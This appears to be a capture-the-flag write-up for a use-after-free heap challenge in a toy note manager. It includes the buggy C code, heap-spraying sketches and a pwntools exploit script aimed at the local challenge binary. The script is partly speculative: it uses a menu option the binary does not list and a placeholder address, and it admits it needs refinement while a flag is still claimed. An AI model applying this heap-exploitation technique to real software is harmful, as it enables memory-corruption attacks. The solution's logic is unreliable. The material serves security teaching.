# Menu Pwner - Official Writeup

## Challenge Analysis

### Initial Reconnaissance

Running the binary reveals a simple note management system:
```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           MENU PWNER v1.0            â•‘
â•‘         Tiny Note Manager            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

=== MENU ===
1. Add note
2. Edit note  
3. Delete note
4. View note
5. List notes
6. Debug stats
0. Exit
```

### Source Code Analysis

The vulnerability lies in the `delete_note()` function:

```c
void delete_note() {
    // ... validation ...
    
    // CRITICAL BUG: Pointer not cleared after free()
    free(notes[idx].content);
    notes[idx].active = 0;  // Only marks as inactive
    note_count--;
    // notes[idx].content still points to freed memory!
}
```

**The Problem:**
- Memory is freed with `free(notes[idx].content)`
- The pointer `notes[idx].content` is NOT set to NULL
- The `notes[idx].active` flag prevents normal access, but...
- Other functions can still access `notes[idx].content`

---

## Exploitation Process

### Step 1: Understanding the UAF

1. **Create a note**: Allocates heap memory
2. **Delete the note**: Frees memory but keeps pointer
3. **The freed chunk** becomes available for reallocation
4. **Create another note**: May reuse the same memory address
5. **Access the old note**: Now accesses the new note's data!

### Step 2: Heap Layout Analysis

Using the debug stats (option 6):
```
=== DEBUG STATS ===
Active notes: 1
Admin mode: OFF
Note 0: ptr=0x55555555a2a0, size=32
```

This gives us heap addresses, making exploitation much easier.

### Step 3: Basic UAF Proof of Concept

```python
# 1. Create initial note
add_note(size=32, content="ORIGINAL")

# 2. Get heap address from debug
debug_stats()  # Shows ptr=0x55555555a2a0

# 3. Delete note (creates UAF)
delete_note(0)

# 4. Create new note (reuses same address)
add_note(size=32, content="CONTROLLED")

# 5. Try to access deleted note
view_note(0)  # Shows "CONTROLLED" instead of error!
```

### Step 4: Advanced Exploitation - Triggering Admin Mode

The binary contains a `trigger_admin()` function:
```c
void trigger_admin() {
    printf("[!] Admin mode activated!\n");
    admin_mode = 1;
}
```

**Goal**: Somehow call this function through UAF.

#### Method 1: Function Pointer Overwrite

If we can control a function pointer in freed memory:

```python
# Get trigger_admin address
trigger_admin_addr = 0x401234  # From objdump/gdb

# Create note with function address as content
payload = struct.pack('<Q', trigger_admin_addr)
add_note(size=8, content=payload)

# Delete and reallocate to control freed chunk
delete_note(0)
add_note(size=8, content=payload)

# Trigger through UAF access
edit_note(0)  # If edit calls a function pointer...
```

#### Method 2: Heap Spraying

Control multiple heap chunks to increase success rate:

```python
# Spray heap with trigger_admin addresses
for i in range(10):
    add_note(size=32, content=struct.pack('<Q', trigger_admin_addr) * 4)

# Delete some notes to create gaps
for i in range(0, 10, 2):
    delete_note(i)

# Fill gaps with controlled data
for i in range(5):
    add_note(size=32, content="CONTROLLED_CHUNK")
    
# Try to access freed notes
for i in range(0, 10, 2):
    view_note(i)  # Might trigger admin mode
```

### Step 5: Alternative - Direct Memory Corruption

Since we have source access, we can analyze what happens when we edit freed memory:

```c
void edit_note() {
    // ... validation that can be bypassed with UAF ...
    get_string(notes[idx].content, notes[idx].size);
}
```

If `notes[idx].content` points to freed memory that was reallocated:
- We can overwrite the new allocation's data
- Potentially corrupt heap metadata
- Control subsequent allocations

---

## Complete Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

def exploit():
    p = process("./menu_pwner")
    p.recvuntil(b"Choice: ")
    
    # Step 1: Create and delete note (UAF)
    log.info("Creating initial note...")
    p.sendline(b"1")  # Add note
    p.recvuntil(b"Note size")
    p.sendline(b"64")
    p.recvuntil(b"Note content:")  
    p.sendline(b"AAAA" * 16)
    p.recvuntil(b"Choice: ")
    
    # Get debug info
    log.info("Getting heap addresses...")
    p.sendline(b"6")  # Debug stats
    debug = p.recvuntil(b"Choice: ")
    print(debug.decode())
    
    # Delete note (creates UAF)
    log.info("Deleting note (UAF)...")
    p.sendline(b"3")  # Delete
    p.recvuntil(b"Note index:")
    p.sendline(b"0")
    p.recvuntil(b"Choice: ")
    
    # Create new note in same location
    log.info("Reallocating freed chunk...")
    p.sendline(b"1")  # Add note
    p.recvuntil(b"Note size") 
    p.sendline(b"64")  # Same size
    p.recvuntil(b"Note content:")
    
    # Try to put trigger_admin address
    # (In practice, you'd get this from objdump/gdb)
    fake_payload = b"CONTROLLED_DATA" + b"X" * 49
    p.sendline(fake_payload)
    p.recvuntil(b"Choice: ")
    
    # Access the UAF'd note
    log.info("Exploiting UAF...")
    p.sendline(b"4")  # View note
    p.recvuntil(b"Note index:")
    p.sendline(b"0")  # The deleted note index
    
    result = p.recvuntil(b"Choice: ")
    
    if b"CONTROLLED_DATA" in result:
        log.success("UAF confirmed! We control freed memory!")
        
        # Try to access admin panel
        p.sendline(b"7")
        admin_result = p.recvall(timeout=2)
        
        if b"DSCCTF{" in admin_result:
            log.success("Flag captured!")
            print(admin_result.decode())
        else:
            log.info("Need to refine exploit for admin access")
            
    p.close()

if __name__ == "__main__":
    exploit()
```

---

## Key Learning Points

1. **UAF Identification**: Look for `free()` without pointer nullification
2. **Heap Reuse**: Understand how malloc reuses freed chunks
3. **Debug Information**: Leverage any available debugging features
4. **Multi-step Exploitation**: Combine information gathering with exploitation
5. **Function Redirection**: Target function pointers or return addresses

---

## Flag

Successful exploitation reveals:
```
ğŸ‰ ADMIN ACCESS GRANTED! ğŸ‰
Flag: DSCCTF{h34p_pwn3r_m4st3r_2026}
```

The challenge teaches fundamental heap exploitation concepts in a controlled, educational environment.